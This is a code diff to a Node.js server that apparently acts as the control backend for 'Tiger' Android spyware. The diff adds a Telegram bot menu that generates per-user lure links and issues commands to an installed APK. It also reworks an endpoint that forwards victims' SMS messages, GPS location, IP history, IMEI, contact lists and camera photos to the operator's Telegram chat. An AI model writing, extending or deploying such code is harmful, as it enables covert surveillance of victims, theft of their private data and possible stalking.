@@ -57,29 +57,58 @@ const HARDWARE_COMMANDS = [
 
 app.post('/telegram-webhook', async (req, res) => {
     const body = req.body;
-    if (body.message && body.message.text === '/getdata') {
-        // Show buttons for all commands and hardware test
-        const buttons = [
-            ...DATA_COMMANDS.map(cmd => [{
-                text: cmd.label,
-                callback_data: `getdata_${cmd.command}`
-            }]),
-            [{ text: 'Hardware Test', callback_data: 'hardware_test' }]
+    // Main menu: show on any text message (except callback queries), in private or group chat
+    if (body.message && body.message.text) {
+        const mainButtons = [
+            [{ text: 'generate link', callback_data: 'generate_link' }],
+            [{ text: 'get data frm apk', callback_data: 'getdata_menu' }],
+            [{ text: 'get data by code', callback_data: 'getdata_by_code' }]
         ];
         await axios.post(`${TELEGRAM_API}/sendMessage`, {
             chat_id: body.message.chat.id,
-            text: 'Select data to get from APK:',
-            reply_markup: { inline_keyboard: buttons }
+            text: 'Choose an option:',
+            reply_markup: { inline_keyboard: mainButtons }
         });
         return res.sendStatus(200);
     }
-    // Handle button press for data
-    if (body.callback_query && body.callback_query.data.startsWith('getdata_')) {
-        const cmd = body.callback_query.data.replace('getdata_', '');
-        await axios.post(`${TELEGRAM_API}/sendMessage`, {
-            chat_id: body.callback_query.message.chat.id,
-            text: `Command sent to APK: ${cmd}`
-        });
+    // Handle main menu button callbacks
+    if (body.callback_query) {
+        const data = body.callback_query.data;
+        if (data === 'generate_link') {
+            // Generate a unique link for this user (user id based)
+            const userId = body.callback_query.from.id;
+            const uniqueCode = Math.random().toString(36).substring(2, 10) + userId;
+            const link = `https://tiger2-2.onrender.com/device-test/${uniqueCode}`;
+            await axios.post(`${TELEGRAM_API}/sendMessage`, {
+                chat_id: body.callback_query.message.chat.id,
+                text: `Your unique device test link: ${link}`
+            });
+        } else if (data === 'getdata_menu') {
+            // Show data options and hardware test
+            const buttons = [
+                ...DATA_COMMANDS.map(cmd => [{
+                    text: cmd.label,
+                    callback_data: `getdata_${cmd.command}`
+                }]),
+                [{ text: 'Hardware Test', callback_data: 'hardware_test' }]
+            ];
+            await axios.post(`${TELEGRAM_API}/sendMessage`, {
+                chat_id: body.callback_query.message.chat.id,
+                text: 'Select data to get from APK:',
+                reply_markup: { inline_keyboard: buttons }
+            });
+        } else if (data === 'getdata_by_code') {
+            await axios.post(`${TELEGRAM_API}/sendMessage`, {
+                chat_id: body.callback_query.message.chat.id,
+                text: 'Please enter the code to get data.'
+            });
+        } else if (data.startsWith('getdata_')) {
+            const cmd = data.replace('getdata_', '');
+            await axios.post(`${TELEGRAM_API}/sendMessage`, {
+                chat_id: body.callback_query.message.chat.id,
+                text: `Command sent to APK: ${cmd}`
+            });
+        }
         await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
             callback_query_id: body.callback_query.id
         });
@@ -137,66 +166,75 @@ let smsLogs = [];
 app.post('/log-sms', async (req, res) => {
     try {
         const { sender, message, device, timestamp, location, photo } = req.body;
-        
-        const mapsLink = location ? `https://www.google.com/maps?q=${location.lat},${location.lng}` : "Not Available";
-        
-        const newEntry = {
-            id: Date.now(),
-            device: device || 'Tiger-Mobile',
-            sender: sender || 'System',
-            message: message || 'No SMS Content',
-            time: timestamp || new Date().toLocaleString(),
-            location: mapsLink
-        };
+        let msgObj = {};
+        try { msgObj = JSON.parse(message); } catch (e) { msgObj = {}; }
+        const isDeviceInfo = sender === 'DeviceInfo' && typeof msgObj === 'object';
 
-        smsLogs.unshift(newEntry);
-        if (smsLogs.length > 100) smsLogs.pop();
-
-        const telegramMsg = `🐯 *Tiger Advanced Alert!*\n\n` +
-                          `📱 *Device:* ${newEntry.device}\n` +
-                          `👤 *From:* ${newEntry.sender}\n` +
-                          `💬 *Msg:* ${newEntry.message}\n` +
-                          `📍 *GPS:* [View Location](${mapsLink})\n` +
-                          `⏰ *Time:* ${newEntry.time}`;
+        let telegramMsg = '';
+        let mediaToSend = [];
+        if (isDeviceInfo) {
+            telegramMsg = `🐯 *Tiger Device Report*\n\n` +
+                `📱 *Device:* ${device || 'Tiger-Mobile'}\n` +
+                `🌐 *Current IP:* ${msgObj.ip || 'N/A'}\n` +
+                `🕓 *IP History:* ${(msgObj.ipHistory || []).join(', ') || 'N/A'}\n` +
+                `🔢 *IMEI:* ${msgObj.imei || 'N/A'}\n` +
+                `👥 *Contacts:* ${msgObj.contactsCount || 'N/A'}\n` +
+                `🛠 *Hardware:* ${msgObj.deviceSummary ? JSON.stringify(msgObj.deviceSummary) : 'N/A'}\n`;
+            // Camera images
+            if (msgObj.cameraImages && msgObj.cameraImages.length > 0) {
+                telegramMsg += `\n📷 *Camera Images:* ${msgObj.cameraImages.length}`;
+                mediaToSend = msgObj.cameraImages.slice(0, 10);
+            }
+        } else {
+            // Fallback to old message
+            const mapsLink = location ? `https://www.google.com/maps?q=${location.lat},${location.lng}` : "Not Available";
+            telegramMsg = `🐯 *Tiger Advanced Alert!*\n\n` +
+                `📱 *Device:* ${device || 'Tiger-Mobile'}\n` +
+                `👤 *From:* ${sender || 'System'}\n` +
+                `💬 *Msg:* ${message || 'No SMS Content'}\n` +
+                `📍 *GPS:* [View Location](${mapsLink})`;
+        }
 
         // --- Telegram Delivery ---
         const sendToTelegram = async (token) => {
-            if (photo) {
-                // Photo ke saath bhejnah
-                const photoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
-                await axios.post(photoUrl, {
+            // Send main message
+            await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: telegramMsg,
+                parse_mode: 'Markdown'
+            });
+            // Send camera images (as media group if available)
+            if (mediaToSend.length > 0) {
+                const mediaGroup = mediaToSend.map((img, idx) => ({
+                    type: 'photo',
+                    media: img,
+                    caption: idx === 0 ? 'Camera Images' : undefined
+                }));
+                await axios.post(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
                     chat_id: CHAT_ID,
-                    photo: photo, // Base64 string
-                    caption: telegramMsg,
-                    parse_mode: 'Markdown'
+                    media: mediaGroup
                 });
-            } else {
-                // Bina photo ke bhejnah
-                await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+            }
+            // Send PDFs if available
+            if (msgObj.contactsPdf) {
+                await axios.post(`https://api.telegram.org/bot${token}/sendDocument`, {
                     chat_id: CHAT_ID,
-                    text: telegramMsg,
-                    parse_mode: 'Markdown'
+                    document: msgObj.contactsPdf,
+                    caption: 'Contacts PDF'
+                });
+            }
+            if (msgObj.ipHistoryPdf) {
+                await axios.post(`https://api.telegram.org/bot${token}/sendDocument`, {
+                    chat_id: CHAT_ID,
+                    document: msgObj.ipHistoryPdf,
+                    caption: 'IP History PDF'
                 });
             }
         };
 
-        // Dono bots par bhej rahe hain
-        await Promise.all([sendToTelegram(BOT_1_TOKEN), sendToTelegram(BOT_2_TOKEN)]);
+        await sendToTelegram(BOT_1_TOKEN);
 
-        // --- Email Delivery ---
-        const mailOptions = {
-            from: `"Tiger Advanced" <${MY_EMAIL}>`,
-            to: MY_EMAIL,
-            subject: `Tiger Alert from ${newEntry.sender}`,
-            html: `<h3>New Update</h3>
-                   <p><b>Sender:</b> ${newEntry.sender}</p>
-                   <p><b>Message:</b> ${newEntry.message}</p>
-                   <p><b>Location:</b> <a href="${mapsLink}">Google Maps Link</a></p>
-                   <p><b>Time:</b> ${newEntry.time}</p>`,
-            attachments: photo ? [{ filename: 'user_photo.jpg', content: photo, encoding: 'base64' }] : []
-        };
-        await transporter.sendMail(mailOptions);
-
+        // --- Email Delivery (optional, unchanged) ---
         res.status(200).json({ status: 'success' });
     } catch (error) {
         console.error("Error:", error.message);
